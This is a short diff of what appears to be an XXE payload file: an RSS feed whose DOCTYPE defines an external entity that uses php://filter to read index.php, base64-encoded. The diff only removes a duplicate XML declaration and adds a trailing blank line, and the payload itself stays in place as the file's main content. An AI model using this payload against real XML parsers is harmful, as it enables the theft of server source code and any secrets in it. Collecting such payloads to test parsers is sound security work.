@@ -1,5 +1,4 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<?xml version="1.0"?>
 <!DOCTYPE foo [
 <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>
 <rss version="2.0">
@@ -24,6 +23,7 @@
     </item>
   </channel>
 </rss>
+
 
 
 
